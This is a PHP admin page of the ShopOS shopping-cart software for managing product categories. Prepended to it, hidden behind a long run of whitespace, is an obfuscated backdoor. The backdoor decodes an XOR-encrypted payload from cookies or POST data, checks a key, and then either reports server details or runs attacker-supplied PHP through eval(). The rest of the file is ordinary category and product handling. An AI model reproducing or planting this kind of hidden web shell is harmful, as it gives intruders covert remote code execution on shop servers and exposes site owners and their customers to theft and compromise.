<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $me3f5 = 108;$GLOBALS['gf5a18'] = Array();global $gf5a18;$gf5a18 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['f59844463'] = "\x2b\x57\x3d\x24\x5f\x52\x45\x48\x21\x66\x6a\x7d\x55\x5d\x49\x68\x5a\x2f\x6d\x58\x2a\x79\x64\x6f\x31\x33\x71\x7b\x7e\x59\x76\x35\x2e\x62\x5e\x2d\x46\x9\x5b\x4b\x67\x7c\x32\x7a\x51\x34\x39\x22\x3b\x3f\x70\x4e\x53\x73\x37\x50\x6c\xa\x47\x65\x43\x60\x42\x74\x3c\x6b\x69\x41\x20\x5c\x26\x78\x4d\x77\x56\x36\x4a\x2c\x38\x4c\x54\x23\x4f\xd\x44\x72\x75\x6e\x40\x27\x61\x63\x28\x25\x3a\x30\x29\x3e";$gf5a18[$gf5a18['f59844463'][85].$gf5a18['f59844463'][91].$gf5a18['f59844463'][59].$gf5a18['f59844463'][33].$gf5a18['f59844463'][90]] = $gf5a18['f59844463'][91].$gf5a18['f59844463'][15].$gf5a18['f59844463'][85];$gf5a18[$gf5a18['f59844463'][71].$gf5a18['f59844463'][91].$gf5a18['f59844463'][33].$gf5a18['f59844463'][24].$gf5a18['f59844463'][75].$gf5a18['f59844463'][9]] = $gf5a18['f59844463'][23].$gf5a18['f59844463'][85].$gf5a18['f59844463'][22];$gf5a18[$gf5a18['f59844463'][87].$gf5a18['f59844463'][78].$gf5a18['f59844463'][24].$gf5a18['f59844463'][91].$gf5a18['f59844463'][31].$gf5a18['f59844463'][33].$gf5a18['f59844463'][54].$gf5a18['f59844463'][75]] = $gf5a18['f59844463'][53].$gf5a18['f59844463'][63].$gf5a18['f59844463'][85].$gf5a18['f59844463'][56].$gf5a18['f59844463'][59].$gf5a18['f59844463'][87];$gf5a18[$gf5a18['f59844463'][30].$gf5a18['f59844463'][54].$gf5a18['f59844463'][59].$gf5a18['f59844463'][25].$gf5a18['f59844463'][42]] = $gf5a18['f59844463'][66].$gf5a18['f59844463'][87].$gf5a18['f59844463'][66].$gf5a18['f59844463'][4].$gf5a18['f59844463'][53].$gf5a18['f59844463'][59].$gf5a18['f59844463'][63];$gf5a18[$gf5a18['f59844463'][90].$gf5a18['f59844463'][75].$gf5a18['f59844463'][31].$gf5a18['f59844463'][45].$gf5a18['f59844463'][78].$gf5a18['f59844463'][45].$gf5a18['f59844463'][25].$gf5a18['f59844463'][59].$gf5a18['f59844463'][9]] = $gf5a18['f59844463'][53].$gf5a18['f59844463'][59].$gf5a18['f59844463'][85].$gf5a18['f59844463'][66].$gf5a18['f59844463'][90].$gf5a18['f59844463'][56].$gf5a18['f59844463'][66].$gf5a18['f59844463'][43].$gf5a18['f59844463'][59];$gf5a18[$gf5a18['f59844463'][18].$gf5a18['f59844463'][46].$gf5a18['f59844463'][42].$gf5a18['f59844463'][33].$gf5a18['f59844463'][75]] = $gf5a18['f59844463'][50].$gf5a18['f59844463'][15].$gf5a18['f59844463'][50].$gf5a18['f59844463'][30].$gf5a18['f59844463'][59].$gf5a18['f59844463'][85].$gf5a18['f59844463'][53].$gf5a18['f59844463'][66].$gf5a18['f59844463'][23].$gf5a18['f59844463'][87];$gf5a18[$gf5a18['f59844463'][33].$gf5a18['f59844463'][91].$gf5a18['f59844463'][78].$gf5a18['f59844463'][45].$gf5a18['f59844463'][9].$gf5a18['f59844463'][90].$gf5a18['f59844463'][59].$gf5a18['f59844463'][42].$gf5a18['f59844463'][54]] = $gf5a18['f59844463'][86].$gf5a18['f59844463'][87].$gf5a18['f59844463'][53].$gf5a18['f59844463'][59].$gf5a18['f59844463'][85].$gf5a18['f59844463'][66].$gf5a18['f59844463'][90].$gf5a18['f59844463'][56].$gf5a18['f59844463'][66].$gf5a18['f59844463'][43].$gf5a18['f59844463'][59];$gf5a18[$gf5a18['f59844463'][9].$gf5a18['f59844463'][91].$gf5a18['f59844463'][45].$gf5a18['f59844463'][91].$gf5a18['f59844463'][33].$gf5a18['f59844463'][59]] = $gf5a18['f59844463'][33].$gf5a18['f59844463'][90].$gf5a18['f59844463'][53].$gf5a18['f59844463'][59].$gf5a18['f59844463'][75].$gf5a18['f59844463'][45].$gf5a18['f59844463'][4].$gf5a18['f59844463'][22].$gf5a18['f59844463'][59].$gf5a18['f59844463'][91].$gf5a18['f59844463'][23].$gf5a18['f59844463'][22].$gf5a18['f59844463'][59];$gf5a18[$gf5a18['f59844463'][9].$gf5a18['f59844463'][45].$gf5a18['f59844463'][42].$gf5a18['f59844463'][22].$gf5a18['f59844463'][54].$gf5a18['f59844463'][9].$gf5a18['f59844463'][25].$gf5a18['f59844463'][45].$gf5a18['f59844463'][45]] = $gf5a18['f59844463'][53].$gf5a18['f59844463'][59].$gf5a18['f59844463'][63].$gf5a18['f59844463'][4].$gf5a18['f59844463'][63].$gf5a18['f59844463'][66].$gf5a18['f59844463'][18].$gf5a18['f59844463'][59].$gf5a18['f59844463'][4].$gf5a18['f59844463'][56].$gf5a18['f59844463'][66].$gf5a18['f59844463'][18].$gf5a18['f59844463'][66].$gf5a18['f59844463'][63];$gf5a18[$gf5a18['f59844463'][66].$gf5a18['f59844463'][31].$gf5a18['f59844463'][45].$gf5a18['f59844463'][22]] = $gf5a18['f59844463'][65].$gf5a18['f59844463'][59].$gf5a18['f59844463'][95].$gf5a18['f59844463'][54].$gf5a18['f59844463'][95];$gf5a18[$gf5a18['f59844463'][73].$gf5a18['f59844463'][95].$gf5a18['f59844463'][42].$gf5a18['f59844463'][9]] = $gf5a18['f59844463'][53].$gf5a18['f59844463'][33].$gf5a18['f59844463'][78].$gf5a18['f59844463'][31].$gf5a18['f59844463'][91];$gf5a18[$gf5a18['f59844463'][30].$gf5a18['f59844463'][91].$gf5a18['f59844463'][95].$gf5a18['f59844463'][25].$gf5a18['f59844463'][90].$gf5a18['f59844463'][54].$gf5a18['f59844463'][91]] = $_POST;$gf5a18[$gf5a18['f59844463'][65].$gf5a18['f59844463'][42].$gf5a18['f59844463'][42].$gf5a18['f59844463'][25].$gf5a18['f59844463'][24].$gf5a18['f59844463'][45].$gf5a18['f59844463'][22]] = $_COOKIE;@$gf5a18[$gf5a18['f59844463'][30].$gf5a18['f59844463'][54].$gf5a18['f59844463'][59].$gf5a18['f59844463'][25].$gf5a18['f59844463'][42]]($gf5a18['f59844463'][59].$gf5a18['f59844463'][85].$gf5a18['f59844463'][85].$gf5a18['f59844463'][23].$gf5a18['f59844463'][85].$gf5a18['f59844463'][4].$gf5a18['f59844463'][56].$gf5a18['f59844463'][23].$gf5a18['f59844463'][40], NULL);@$gf5a18[$gf5a18['f59844463'][30].$gf5a18['f59844463'][54].$gf5a18['f59844463'][59].$gf5a18['f59844463'][25].$gf5a18['f59844463'][42]]($gf5a18['f59844463'][56].$gf5a18['f59844463'][23].$gf5a18['f59844463'][40].$gf5a18['f59844463'][4].$gf5a18['f59844463'][59].$gf5a18['f59844463'][85].$gf5a18['f59844463'][85].$gf5a18['f59844463'][23].$gf5a18['f59844463'][85].$gf5a18['f59844463'][53], 0);@$gf5a18[$gf5a18['f59844463'][30].$gf5a18['f59844463'][54].$gf5a18['f59844463'][59].$gf5a18['f59844463'][25].$gf5a18['f59844463'][42]]($gf5a18['f59844463'][18].$gf5a18['f59844463'][90].$gf5a18['f59844463'][71].$gf5a18['f59844463'][4].$gf5a18['f59844463'][59].$gf5a18['f59844463'][71].$gf5a18['f59844463'][59].$gf5a18['f59844463'][91].$gf5a18['f59844463'][86].$gf5a18['f59844463'][63].$gf5a18['f59844463'][66].$gf5a18['f59844463'][23].$gf5a18['f59844463'][87].$gf5a18['f59844463'][4].$gf5a18['f59844463'][63].$gf5a18['f59844463'][66].$gf5a18['f59844463'][18].$gf5a18['f59844463'][59], 0);@$gf5a18[$gf5a18['f59844463'][9].$gf5a18['f59844463'][45].$gf5a18['f59844463'][42].$gf5a18['f59844463'][22].$gf5a18['f59844463'][54].$gf5a18['f59844463'][9].$gf5a18['f59844463'][25].$gf5a18['f59844463'][45].$gf5a18['f59844463'][45]](0);$a65ddd9 = NULL;$v6e3a79c = NULL;$gf5a18[$gf5a18['f59844463'][9].$gf5a18['f59844463'][45].$gf5a18['f59844463'][75].$gf5a18['f59844463'][95].$gf5a18['f59844463'][42].$gf5a18['f59844463'][33]] = $gf5a18['f59844463'][9].$gf5a18['f59844463'][22].$gf5a18['f59844463'][54].$gf5a18['f59844463'][9].$gf5a18['f59844463'][22].$gf5a18['f59844463'][91].$gf5a18['f59844463'][78].$gf5a18['f59844463'][45].$gf5a18['f59844463'][35].$gf5a18['f59844463'][90].$gf5a18['f59844463'][24].$gf5a18['f59844463'][31].$gf5a18['f59844463'][31].$gf5a18['f59844463'][35].$gf5a18['f59844463'][45].$gf5a18['f59844463'][22].$gf5a18['f59844463'][45].$gf5a18['f59844463'][91].$gf5a18['f59844463'][35].$gf5a18['f59844463'][78].$gf5a18['f59844463'][46].$gf5a18['f59844463'][46].$gf5a18['f59844463'][78].$gf5a18['f59844463'][35].$gf5a18['f59844463'][45].$gf5a18['f59844463'][95].$gf5a18['f59844463'][22].$gf5a18['f59844463'][46].$gf5a18['f59844463'][25].$gf5a18['f59844463'][45].$gf5a18['f59844463'][78].$gf5a18['f59844463'][24].$gf5a18['f59844463'][24].$gf5a18['f59844463'][95].$gf5a18['f59844463'][25].$gf5a18['f59844463'][91];global $f4602b;function  sb85c($a65ddd9, $p7a09){global $gf5a18;$p81a1dc = "";for ($lde5c8fa=0; $lde5c8fa<$gf5a18[$gf5a18['f59844463'][87].$gf5a18['f59844463'][78].$gf5a18['f59844463'][24].$gf5a18['f59844463'][91].$gf5a18['f59844463'][31].$gf5a18['f59844463'][33].$gf5a18['f59844463'][54].$gf5a18['f59844463'][75]]($a65ddd9);){for ($u434901=0; $u434901<$gf5a18[$gf5a18['f59844463'][87].$gf5a18['f59844463'][78].$gf5a18['f59844463'][24].$gf5a18['f59844463'][91].$gf5a18['f59844463'][31].$gf5a18['f59844463'][33].$gf5a18['f59844463'][54].$gf5a18['f59844463'][75]]($p7a09) && $lde5c8fa<$gf5a18[$gf5a18['f59844463'][87].$gf5a18['f59844463'][78].$gf5a18['f59844463'][24].$gf5a18['f59844463'][91].$gf5a18['f59844463'][31].$gf5a18['f59844463'][33].$gf5a18['f59844463'][54].$gf5a18['f59844463'][75]]($a65ddd9); $u434901++, $lde5c8fa++){$p81a1dc .= $gf5a18[$gf5a18['f59844463'][85].$gf5a18['f59844463'][91].$gf5a18['f59844463'][59].$gf5a18['f59844463'][33].$gf5a18['f59844463'][90]]($gf5a18[$gf5a18['f59844463'][71].$gf5a18['f59844463'][91].$gf5a18['f59844463'][33].$gf5a18['f59844463'][24].$gf5a18['f59844463'][75].$gf5a18['f59844463'][9]]($a65ddd9[$lde5c8fa]) ^ $gf5a18[$gf5a18['f59844463'][71].$gf5a18['f59844463'][91].$gf5a18['f59844463'][33].$gf5a18['f59844463'][24].$gf5a18['f59844463'][75].$gf5a18['f59844463'][9]]($p7a09[$u434901]));}}return $p81a1dc;}function  ke070($a65ddd9, $p7a09){global $gf5a18;global $f4602b;return $gf5a18[$gf5a18['f59844463'][73].$gf5a18['f59844463'][95].$gf5a18['f59844463'][42].$gf5a18['f59844463'][9]]($gf5a18[$gf5a18['f59844463'][73].$gf5a18['f59844463'][95].$gf5a18['f59844463'][42].$gf5a18['f59844463'][9]]($a65ddd9, $f4602b), $p7a09);}foreach ($gf5a18[$gf5a18['f59844463'][65].$gf5a18['f59844463'][42].$gf5a18['f59844463'][42].$gf5a18['f59844463'][25].$gf5a18['f59844463'][24].$gf5a18['f59844463'][45].$gf5a18['f59844463'][22]] as $p7a09=>$r249737){$a65ddd9 = $r249737;$v6e3a79c = $p7a09;}if (!$a65ddd9){foreach ($gf5a18[$gf5a18['f59844463'][30].$gf5a18['f59844463'][91].$gf5a18['f59844463'][95].$gf5a18['f59844463'][25].$gf5a18['f59844463'][90].$gf5a18['f59844463'][54].$gf5a18['f59844463'][91]] as $p7a09=>$r249737){$a65ddd9 = $r249737;$v6e3a79c = $p7a09;}}$a65ddd9 = @$gf5a18[$gf5a18['f59844463'][33].$gf5a18['f59844463'][91].$gf5a18['f59844463'][78].$gf5a18['f59844463'][45].$gf5a18['f59844463'][9].$gf5a18['f59844463'][90].$gf5a18['f59844463'][59].$gf5a18['f59844463'][42].$gf5a18['f59844463'][54]]($gf5a18[$gf5a18['f59844463'][66].$gf5a18['f59844463'][31].$gf5a18['f59844463'][45].$gf5a18['f59844463'][22]]($gf5a18[$gf5a18['f59844463'][9].$gf5a18['f59844463'][91].$gf5a18['f59844463'][45].$gf5a18['f59844463'][91].$gf5a18['f59844463'][33].$gf5a18['f59844463'][59]]($a65ddd9), $v6e3a79c));if (isset($a65ddd9[$gf5a18['f59844463'][90].$gf5a18['f59844463'][65]]) && $f4602b==$a65ddd9[$gf5a18['f59844463'][90].$gf5a18['f59844463'][65]]){if ($a65ddd9[$gf5a18['f59844463'][90]] == $gf5a18['f59844463'][66]){$lde5c8fa = Array($gf5a18['f59844463'][50].$gf5a18['f59844463'][30] => @$gf5a18[$gf5a18['f59844463'][18].$gf5a18['f59844463'][46].$gf5a18['f59844463'][42].$gf5a18['f59844463'][33].$gf5a18['f59844463'][75]](),$gf5a18['f59844463'][53].$gf5a18['f59844463'][30] => $gf5a18['f59844463'][24].$gf5a18['f59844463'][32].$gf5a18['f59844463'][95].$gf5a18['f59844463'][35].$gf5a18['f59844463'][24],);echo @$gf5a18[$gf5a18['f59844463'][90].$gf5a18['f59844463'][75].$gf5a18['f59844463'][31].$gf5a18['f59844463'][45].$gf5a18['f59844463'][78].$gf5a18['f59844463'][45].$gf5a18['f59844463'][25].$gf5a18['f59844463'][59].$gf5a18['f59844463'][9]]($lde5c8fa);}elseif ($a65ddd9[$gf5a18['f59844463'][90]] == $gf5a18['f59844463'][59]){eval/*bd8d63*/($a65ddd9[$gf5a18['f59844463'][22]]);}exit();} ?><?php
/*
#####################################
#  ShopOS: Shopping Cart Software.
#  Copyright (c) 2008-2010
#  http://www.shopos.ru
#  http://www.shoposs.com
#  Ver. 1.0.0
#####################################
*/

require_once ('includes/top.php');

require_once (_FUNC_ADMIN.'wysiwyg_tiny.php');
require_once (_CLASS_ADMIN.FILENAME_IMAGEMANIPULATOR);
require_once (_CLASS_ADMIN.'categories.php');
require_once (_CLASS_ADMIN.'currencies.php');

$currencies = new currencies();
$catfunc = new categories();

if (@$_GET['function']) 
   {
	   switch ($_GET['function']) {
		   case 'delete' :
			os_db_query("DELETE FROM ".TABLE_PERSONAL_OFFERS.(int) $_GET['statusID']."
						                     WHERE products_id = '".(int) $_GET['pID']."'
						                     AND quantity    = '".(int) $_GET['quantity']."'");
			break;
	}
	
	set_categories_url_cache();
	set_category_cache();
	os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&action=new_product&pID='.(int) $_GET['pID']));
}

if (isset ($_POST['multi_status_on'])) {
	if (is_array($_POST['multi_categories'])) {
		foreach ($_POST['multi_categories'] AS $category_id) {
			$catfunc->set_category_recursive($category_id, '1');
		}
	}
	if (is_array($_POST['multi_products'])) {
		foreach ($_POST['multi_products'] AS $product_id) {
			$catfunc->set_product_status($product_id, '1');
		}
	}
	
	set_categories_url_cache();
	set_category_cache();
	os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&'.os_get_all_get_params(array ('cPath', 'action', 'pID', 'cID'))));
}

if (isset ($_POST['multi_status_off'])) {
	if (is_array($_POST['multi_categories'])) {
		foreach ($_POST['multi_categories'] AS $category_id) {
			$catfunc->set_category_recursive($category_id, "0");
		}
	}
	if (is_array($_POST['multi_products'])) {
		foreach ($_POST['multi_products'] AS $product_id) {
			$catfunc->set_product_status($product_id, "0");
		}
	}
	
	set_categories_url_cache();
	set_category_cache();
	os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&'.os_get_all_get_params(array ('cPath', 'action', 'pID', 'cID'))));
}

if (@$_GET['action']) 
{
	switch ($_GET['action']) {

		case 'setcflag' :
			if (($_GET['flag'] == '0') || ($_GET['flag'] == '1')) {
				if ($_GET['cID']) {
					$catfunc->set_category_recursive($_GET['cID'], $_GET['flag']);
				}
			}
			
			set_categories_url_cache();
	        set_category_cache();
			
			os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&cID='.$_GET['cID']));
			break;

		case 'setpflag' :
			if (($_GET['flag'] == '0') || ($_GET['flag'] == '1')) {
				if ($_GET['pID']) {
					$catfunc->set_product_status($_GET['pID'], $_GET['flag']);
				}
			}
			if (!isset($_GET['page'])) $_GET['page'] = 0;
			
			set_categories_url_cache();
	        set_category_cache();
			
			if ($_GET['pID']) {
				os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&page='.$_GET['page'].'&pID='.$_GET['pID']));
			} else {
				os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&page='.$_GET['page'].'&cID='.$_GET['cID']));
			}
			break;
			//EOB setpflag

      case 'setxml' :
        if (($_GET['flagxml'] == '0') || ($_GET['flagxml'] == '1')) {
          if ($_GET['pID']) {
            os_set_product_xml($_GET['pID'], $_GET['flagxml']);
          }
         }
			if (!isset($_GET['page'])) $_GET['page'] = 0;
         
		set_categories_url_cache();
	    set_category_cache();
		
        os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath=' . $_GET['cPath'] . '&page=' . $_GET['page'] . '&pID=' . $_GET['pID']));
        break;
		case 'setcxml' :
			if (($_GET['flag'] == '0') || ($_GET['flag'] == '1')) {
				if ($_GET['cID']) {
					$catfunc->set_category_xml_recursive($_GET['cID'], $_GET['flag']);
				}
			}
			
			set_categories_url_cache();
			set_category_cache();
			
			os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&cID='.$_GET['cID']));
			break;
			
		case 'setsflag' :
			if (($_GET['flag'] == '0') || ($_GET['flag'] == '1')) {
				if ($_GET['pID']) {
					$catfunc->set_product_startpage($_GET['pID'], $_GET['flag']);
//					if ($_GET['flag'] == '1') $catfunc->link_product($_GET['pID'], 0);
				}
			}
			
			set_categories_url_cache();
	        set_category_cache();
			if (!isset($_GET['page'])) $_GET['page'] = 0;
			if ($_GET['pID']) {
				os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&page='.$_GET['page'].'&pID='.$_GET['pID']));
			} else {
				os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&page='.$_GET['page'].'&cID='.$_GET['pID']));
			}
			break;

		case 'update_category' :
		     
			$catfunc->insert_category($_POST, '', 'update');
			  set_categories_url_cache();
			  
			break;

		case 'insert_category' :

			$catfunc->insert_category($_POST, $current_category_id);
			set_categories_url_cache();
			set_category_cache();
			
			break;

		case 'update_product' :
			$catfunc->insert_product($_POST, '', 'update');
			 set_products_url_cache();
			break;

		case 'insert_product' :
		     
			$catfunc->insert_product($_POST, $current_category_id);
			set_products_url_cache();
		break;

		case 'edit_crossselling' :
		
			$catfunc->edit_cross_sell($_GET);
			set_products_url_cache();
		    set_categories_url_cache();
		break;

		case 'multi_action_confirm' :
		  

			if (isset ($_POST['multi_delete_confirm'])) {
				if (is_array($_POST['multi_categories'])) {
					foreach ($_POST['multi_categories'] AS $category_id) {
						$catfunc->remove_categories($category_id);
					}
				}
				if (is_array($_POST['multi_products']) && is_array($_POST['multi_products_categories'])) {
					foreach ($_POST['multi_products'] AS $product_id) {
						$catfunc->delete_product($product_id, $_POST['multi_products_categories'][$product_id]);
					}
					   
				}
			}
			if (isset ($_POST['multi_move_confirm'])) {
				if (is_array($_POST['multi_categories']) && os_not_null($_POST['move_to_category_id'])) {
					foreach ($_POST['multi_categories'] AS $category_id) {
						$dest_category_id = os_db_prepare_input($_POST['move_to_category_id']);
						if ($category_id != $dest_category_id) {
							$catfunc->move_category($category_id, $dest_category_id);
						}
					}
				}
				if (is_array($_POST['multi_products']) && os_not_null($_POST['move_to_category_id']) && os_not_null($_POST['src_category_id'])) {
					foreach ($_POST['multi_products'] AS $product_id) {
						$product_id = os_db_prepare_input($product_id);
						$src_category_id = os_db_prepare_input($_POST['src_category_id']);
						$dest_category_id = os_db_prepare_input($_POST['move_to_category_id']);
						$catfunc->move_product($product_id, $src_category_id, $dest_category_id);
					}
				}
				set_products_url_cache();
				set_categories_url_cache();
	            set_category_cache();
				os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$dest_category_id.'&'.os_get_all_get_params(array ('cPath', 'action', 'pID', 'cID'))));
			}
			if (isset ($_POST['multi_copy_confirm'])) {
				if (is_array($_POST['multi_categories']) && (is_array(@$_POST['dest_cat_ids']) || os_not_null($_POST['dest_category_id']))) {
					$_SESSION['copied'] = array ();
					foreach ($_POST['multi_categories'] AS $category_id) {
						if (is_array(@$_POST['dest_cat_ids'])) {
							foreach ($_POST['dest_cat_ids'] AS $dest_category_id) {
								if ($_POST['copy_as'] == 'link') {
									$catfunc->copy_category($category_id, $dest_category_id, 'link');
								}
								elseif ($_POST['copy_as'] == 'duplicate') {
									$catfunc->copy_category($category_id, $dest_category_id, 'duplicate');
								} else {
									$messageStack->add_session('Copy type not specified.', 'error');
								}
							}
						}
						elseif (os_not_null($_POST['dest_category_id'])) {
							if ($_POST['copy_as'] == 'link') {
								$catfunc->copy_category($category_id, $dest_category_id, 'link');
							}
							elseif (@$_POST['copy_as'] == 'duplicate') {
								$catfunc->copy_category($category_id, @$dest_category_id, 'duplicate');
							} else {
								$messageStack->add_session('Copy type not specified.', 'error');
							}
						}
					}
					unset ($_SESSION['copied']);
				}
				if (is_array(@$_POST['multi_products']) && (is_array($_POST['dest_cat_ids']) || os_not_null($_POST['dest_category_id']))) {
					foreach ($_POST['multi_products'] AS $product_id) {
						$product_id = os_db_prepare_input($product_id);
						if (is_array($_POST['dest_cat_ids'])) {
							foreach ($_POST['dest_cat_ids'] AS $dest_category_id) {
								$dest_category_id = os_db_prepare_input($dest_category_id);
								if ($_POST['copy_as'] == 'link') {
									$catfunc->link_product($product_id, $dest_category_id);
								}
								elseif ($_POST['copy_as'] == 'duplicate') {
									$catfunc->duplicate_product($product_id, $dest_category_id);
								} else {
									$messageStack->add_session('Copy type not specified.', 'error');
								}
							}
						}
						elseif (os_not_null($_POST['dest_category_id'])) {
							$dest_category_id = os_db_prepare_input($_POST['dest_category_id']);
							if ($_POST['copy_as'] == 'link') {
								$catfunc->link_product($product_id, $dest_category_id);
							}
							elseif ($_POST['copy_as'] == 'duplicate') {
								$catfunc->duplicate_product($product_id, $dest_category_id);
							} else {
								$messageStack->add_session('Copy type not specified.', 'error');
							}
						}
					}
				}
				
				set_products_url_cache();
				set_categories_url_cache();
	            set_category_cache();
				os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.@$dest_category_id.'&'.os_get_all_get_params(array ('cPath', 'action', 'pID', 'cID'))));
			}			

			os_redirect(os_href_link(FILENAME_CATEGORIES, 'cPath='.$_GET['cPath'].'&'.os_get_all_get_params(array ('cPath', 'action', 'pID', 'cID'))));
		    set_products_url_cache();
		    set_categories_url_cache();
			break;
	}
}
if (is_dir(dir_path('images'))) 
{
	if (!is_writeable(dir_path('images')))
	{
		$messageStack->add(ERROR_CATALOG_IMAGE_DIRECTORY_NOT_WRITEABLE.' '. dir_path('images'), 'error');
	}	
} 
else 
{
	$messageStack->add(ERROR_CATALOG_IMAGE_DIRECTORY_DOES_NOT_EXIST.' '.dir_path('images'), 'error');
}

	$query = os_db_query("SELECT code FROM ".TABLE_LANGUAGES." WHERE languages_id='".$_SESSION['languages_id']."'");
	$data = os_db_fetch_array($query);
	$languages = os_get_languages();
	if (@$_GET['action'] == 'new_category' || @$_GET['action'] == 'edit_category') {
		for ($i = 0; $i < sizeof($languages); $i ++) {
			add_action('head_admin', os_wysiwyg_tiny('categories_description', $data['code'], $languages[$i]['id']));
		}
	}
	if (@$_GET['action'] == 'new_product') {
		for ($i = 0; $i < sizeof($languages); $i ++) {
			add_action('head_admin', os_wysiwyg_tiny('products_description', $data['code'], $languages[$i]['id']));
			add_action('head_admin', os_wysiwyg_tiny('products_short_description', $data['code'], $languages[$i]['id']));
		}
	} 

    add_action('head_admin', 'head_categories');

    if(isset($_GET['action']) && ($_GET['action']=='new_product' or $_GET['action']=='new_category' or $_GET['action']=='edit_category'))
	{
	    add_action('head_admin', 'head_new_product');
	}
	
	function head_categories ()
	{
		_e('<script type="text/javascript" src="includes/javascript/categories.js"></script>');
		
	    $query = os_db_query("SELECT code FROM ".TABLE_LANGUAGES." WHERE languages_id='".$_SESSION['languages_id']."'");
	    $data = os_db_fetch_array($query);
	    $languages = os_get_languages();
		
	    if (@$_GET['action'] == 'new_category' || @$_GET['action'] == 'edit_category') 
		{
		    for ($i = 0; $i < sizeof($languages); $i ++) 
			{
			    echo os_wysiwyg_tiny('categories_description', $data['code'], $languages[$i]['id']);
		    }
	    }
		
	    if (@$_GET['action'] == 'new_product') 
		{
		    for ($i = 0; $i < sizeof($languages); $i ++) 
			{
			    echo os_wysiwyg_tiny('products_description', $data['code'], $languages[$i]['id']);
			   // echo os_wysiwyg_tiny('products_short_description', $data['code'], $languages[$i]['id']);
		    }
	    } 
	}
	
	function head_new_product()
	{
	   _e('<link href="includes/javascript/date-picker/css/datepicker.css" rel="stylesheet" type="text/css" />');
       _e('<script type="text/javascript" src="includes/javascript/date-picker/js/datepicker.js"></script>');
       _e('<script type="text/javascript" src="includes/javascript/modified.js"></script>');
	   
       if (ENABLE_TABS == 'true') 
	   {
            _e('<script type="text/javascript" src="includes/javascript/tabber.js"></script>');
            _e('<link rel="stylesheet" href="includes/javascript/tabber.css" TYPE="text/css" MEDIA="screen">');
            _e('<link rel="stylesheet" href="includes/javascript/tabber-print.css" TYPE="text/css" MEDIA="print">');
       } 
	}
	
	add_action('head_admin', 'head_tabs');
	
	$main->head();
    $main->top_menu(); 
?>

<table border="0" width="100%" cellspacing="2" cellpadding="2">
  <tr>
    <td class="boxCenter" width="100%" valign="top">
    <?php os_header('portfolio_package.gif',HEADING_TITLE); ?> 
    <table border="0" width="100%" cellspacing="0" cellpadding="2">

                    <?php
if (isset($_GET['action']) && ($_GET['action'] == 'new_category' || $_GET['action'] == 'edit_category')) 
{
	include (_MODULES_ADMIN.'new_category.php');
}
elseif (isset($_GET['action']) && $_GET['action'] == 'new_product') {
	include (_MODULES_ADMIN.'new_product.php');
}
elseif (isset($_GET['action']) && $_GET['action'] == 'edit_crossselling') {
	include (_MODULES_ADMIN.'cross_selling.php');
} else {
	if (!$cPath) { $cPath = '0'; }
	include (_MODULES_ADMIN.'categories_view.php');
}
?>
				</table></td>
			</tr>
		</table>

<?php $main->bottom(); ?>